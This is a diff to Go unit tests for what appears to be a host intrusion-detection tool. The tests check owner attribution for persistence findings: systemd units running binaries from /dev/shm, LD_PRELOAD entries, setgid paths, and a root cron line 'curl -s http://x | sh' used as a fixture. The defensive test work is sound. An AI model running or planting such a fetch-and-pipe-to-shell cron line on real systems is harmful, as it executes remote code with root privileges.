@@ -161,8 +161,13 @@ func findingOwners(fs []Finding) map[string]string {
 // Owners come from where a finding was read, never from its kind alone.
 func TestFindingOwners(t *testing.T) {
 	gid6, uid33, uid0 := uint32(6), uint32(33), uint32(0)
+	gid33 := uint32(33)
 	cur := State{
-		Services: &system.ServicesResult{Environment: []string{
+		Accounts: &system.AccountsResult{Groups: []system.Group{{Name: "disk", GID: 6}, {Name: "www-data", GID: 33}}},
+		Services: &system.ServicesResult{Units: []system.Unit{
+			{File: collector.File{Path: "/var/www/.config/systemd/user/x.service"}, User: "0", Exec: []string{"ExecStart=/dev/shm/x"}},
+			{File: collector.File{Path: "/etc/systemd/system/y.service"}, User: "0", Exec: []string{"ExecStart=/dev/shm/y"}},
+		}, Environment: []string{
 			"LD_PRELOAD=/dev/shm/a.so (var/www/.config/environment.d/x.conf)",
 			"LD_PRELOAD=/dev/shm/b.so (etc/environment.d/50-x.conf)",
 		}},
@@ -170,6 +175,7 @@ func TestFindingOwners(t *testing.T) {
 			{Path: "/srv/x/disk", Mode: "grwxr-xr-x", UID: &uid33, GID: &gid6},
 			{Path: "/srv/x/mine", Mode: "urwxr-xr-x", UID: &uid33, GID: &uid33},
 			{Path: "/srv/x/root", Mode: "urwxr-xr-x", UID: &uid0, GID: &uid0},
+			{Path: "/srv/x/web", Mode: "grwxr-xr-x", UID: &uid33, GID: &gid33},
 		}},
 	}
 	owners := findingOwners(Evaluate(nil, cur))
@@ -179,6 +185,9 @@ func TestFindingOwners(t *testing.T) {
 		"privileged:setid:root|/srv/x/disk":   "root",
 		"privileged:setid:uid 33|/srv/x/mine": "uid 33",
 		"privileged:setid:root|/srv/x/root":   "root",
+		"privileged:setid:uid 33|/srv/x/web":  "uid 33",
+		"persistence:unit-exec:home /var/www|/var/www/.config/systemd/user/x.service:ExecStart=/dev/shm/x": "home /var/www",
+		"persistence:unit-exec:root|/etc/systemd/system/y.service:ExecStart=/dev/shm/y":                    "root",
 	} {
 		if got, ok := owners[fp]; !ok || got != want {
 			t.Errorf("%s: owner %q (present %v), want %q", fp, got, ok, want)
@@ -194,5 +203,22 @@ func TestFindingOwners(t *testing.T) {
 	owners = findingOwners(Evaluate(&prev, cur))
 	if owners["ssh-change:key:toor|SHA256:t"] != "root" || owners["ssh-change:key:www-data|SHA256:w"] != "www-data" {
 		t.Errorf("key owners %v", owners)
+	}
+}
+
+// A cron line seen before in one table is still new in another.
+func TestCronLinesAreKnownPerTable(t *testing.T) {
+	line := "* * * * * root curl -s http://x | sh"
+	prev := State{Scheduled: &system.ScheduledResult{Tables: []system.CronTable{{File: collector.File{Path: "/var/spool/cron/crontabs/www-data"}, Entries: []string{line}}}}}
+	cur := State{Scheduled: &system.ScheduledResult{Tables: []system.CronTable{
+		{File: collector.File{Path: "/var/spool/cron/crontabs/www-data"}, Entries: []string{line}},
+		{File: collector.File{Path: "/etc/cron.d/x"}, Entries: []string{line}},
+	}}}
+	owners := findingOwners(Evaluate(&prev, cur))
+	if owners["persistence-change:cron:/etc/cron.d/x|"+line] != "root" {
+		t.Fatalf("the line in root's table raised nothing: %v", owners)
+	}
+	if homeOwner("/root/.config/environment.d/x.conf") != "root" || homeOwner("/run/user/33/x") == "root" {
+		t.Error("/root or /run/user owners")
 	}
 }
